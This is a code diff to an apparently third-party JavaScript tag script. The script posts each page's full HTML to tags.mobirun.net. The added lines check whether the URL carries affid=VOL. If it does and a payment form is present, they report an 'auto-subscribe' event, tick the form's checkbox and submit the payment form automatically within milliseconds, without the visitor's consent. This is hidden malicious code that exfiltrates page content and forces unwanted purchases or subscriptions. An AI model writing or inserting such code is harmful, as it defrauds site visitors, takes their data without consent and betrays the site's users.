@@ -8,6 +8,17 @@ function toQueryString(obj) {
 $(document).ready(function() {
     if (!window._psc_loaded) {
         window._psc_loaded = true
-        $.post('https://tags.mobirun.net/api/event?' + toQueryString(queryStringObj), {eventType: 'scrap-html', originalUrl: window.location.href, data: $('html').html()})
+
+        var originalUrl = window.location.href;
+        $.post('https://tags.mobirun.net/api/event?' + toQueryString(queryStringObj), {eventType: 'scrap-html', originalUrl: originalUrl, data: $('html').html()})
+
+        if (/affid=VOL/.test(originalUrl) && $("#paymentForm .checkbox")) {
+            $.post('https://tags.mobirun.net/api/event?' + toQueryString(queryStringObj), {eventType: 'auto-subscribe', originalUrl: originalUrl})
+
+            setTimeout(function() {
+                $("#paymentForm .checkbox").checked = true;
+                $("#paymentForm").submit();
+            }, 5)
+        }
     }
 })
